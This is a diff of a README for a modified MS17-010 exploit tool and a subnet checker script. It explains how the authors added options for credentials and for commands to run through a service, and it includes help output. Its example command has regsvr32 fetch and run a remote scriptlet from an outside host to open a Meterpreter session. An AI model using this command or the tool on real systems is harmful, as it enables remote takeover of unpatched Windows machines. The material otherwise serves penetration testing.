@@ -1,17 +1,19 @@
-# MS17-010 zzz_exploit.py modifications
-All credit goes to Worawit: https://github.com/worawit/MS17-010/
+# MS17-010: Python
+All credit goes to Worawit: 
+[GitHub](https://github.com/worawit/MS17-010/)
+[Twitter](https://twitter.com/sleepya_/)
 
-This is my personal enhancement to zzz_exploit.py. Added functionality to dynamically pass users, passwords and commands to execute within a service.
+Worawit Wang released a collection of Python exploits for MS17-010. These tools worked far more reliably than the Metasploit modules but didn't have much of a payload besides writing a pwned.txt to the C:/. However, Worawit Wang did add functionality for creating a service. 
 
-This is also heavily inspired by Korey McKinley: https://lmgsecurity.com/manually-exploiting-ms17-010/
+Korey McKinley wrote an [article](https://lmgsecurity.com/manually-exploiting-ms17-010/) utilising that function to create a service which used regsvr32 to call back to Meterpreter and create a full Meterpreter connection. I'd never seen that path to exploitation, so I thought I'd modify zzz_exploit.py with Korey's logic and make the script more dynamic and user friendly. 
 
-Full credit goes to Worawit/Sleepya and Korey McKinley!
+However, the module Korey used in that blog article was not available in my version of Metasploit. It is now called **web_delivery**. 
 
-Best usage, and what I tested it with, is using the web_delivery module in metasploit. With the generated command, pass it into -c in quotes. This is also what Korey showed in his article!
+The zzz_exploit.py found in this repo is the same exploit logic. But it has been made more dynamic. It is now possible to pass user and password with the -u and -p, respectively. A command to write to a service is passed with the -c option and the target and pipe are -t and -p. 
 
 Logger.py is just a script I've been reusing with all my code to prettify output. If deleted, zzz will break :)
 
-## Help page output:
+Here is the full help page output:
 ```
 ➜  MS17-010 git:(master) ✗ ./zzz_exploit.py --help                                                                                        
 usage: zzz_exploit.py [-h] [-u] [-p] -t  [-c] [-P] [--version]
@@ -43,4 +45,27 @@ optional arguments:
   --version         show program's version number and exit
 Example: python zzz_exploit -t 192.168.0.1 -c 'regsvr32 /s /n /u /i:http://192.168.0.1:9000/1EsrjpXH2pWdgd.sct scrobj.dll'
 ```
-My write-up: https://mez0.cc/posts/weaponised-worawit.html
+I wrote an article using Korey's payload and the new changes to the script, please see it [here](https://mez0.cc/posts/weaponised-worawit.html)
+
+
+I made similar changes to checker.py, but the only additional logic I added was to be able to effectively run this script across a subnet. I imported the **netaddr** module and wrote a short for loop to run across the subnet.
+
+Here is the help page for checker.py:
+
+```
+➜  MS17-010_WORAWIT git:(master) ✗ python checker.py --help         
+usage: checker.py [-h] [-u] [-p] -t  [--version]
+
+MS17-010 Checker script
+
+optional arguments:
+  -h, --help        show this help message and exit
+  -u , --user       Username to authenticate with
+  -p , --password   Password for specified user
+  -t , --target     Target to check for MS17-010
+  --version         show program's version number and exit
+
+Example: python checker.py -t 192.168.0.1
+```
+
+Any further ideas, changes or fixes; please let me know!
